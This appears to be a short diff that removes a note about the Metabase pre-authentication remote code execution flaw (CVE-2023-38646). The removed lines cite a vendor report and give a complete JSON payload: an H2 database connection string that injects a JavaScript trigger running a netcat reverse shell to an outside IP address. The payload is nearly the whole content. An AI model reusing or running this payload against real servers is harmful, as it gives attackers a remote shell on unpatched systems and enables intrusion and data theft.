@@ -1,4 +1,0 @@
-@@Metabase Pre-Auth RCE (CVE-2023-38646)
-https://www.skshieldus.com/download/files/download.do?o_fname=EQST%20insight_%20202308.pdf&r_fname=20230823180053759.pdf
-
-"db":"mem:test:AUTO_RECONNECT=TRUE\\;create trigger kthtest before select on information_schema.tables as $$//javascript\njava.lang.Runtime.getRuntime().exec('nc 111.111.111.111 9999 -e /bin/sh')\n$$--=x\\;"
